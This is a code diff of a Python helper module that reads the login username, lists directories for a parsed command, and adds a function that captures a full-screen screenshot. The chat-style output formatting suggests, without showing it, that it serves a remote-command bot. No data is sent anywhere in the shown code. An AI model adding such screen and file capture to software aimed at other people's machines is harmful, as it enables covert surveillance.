@@ -1,4 +1,5 @@
 import os
+import mss
 
 username = os.getlogin()
 scriptPath = os.getcwd()
@@ -15,13 +16,18 @@ SYSTEM = {
 def getCurrentDir():
     return os.getcwd()
 
-def ls(path=getCurrentDir()):
+def ls(string):
+    if len(string) == 1:
+        path = getCurrentDir()
+    else:
+        path = string[1]
+
     try:
         if path[1] == ":":
             normalizePath = path
         else:
             normalizePath = f"{getCurrentDir()}\\{path}"
-            
+
         out = f'Folder: `{normalizePath}`\nElements: {len(os.listdir(path))}\n\n'
         files = os.listdir(path)
         for i in files:
@@ -32,3 +38,7 @@ def ls(path=getCurrentDir()):
             return 'Huge list'
     except:
         return f"Dir not exist: {normalizePath}"
+
+def getScreen():
+    with mss.mss() as sct:
+        return sct.shot(mon=-1, output="fullscreen.png")
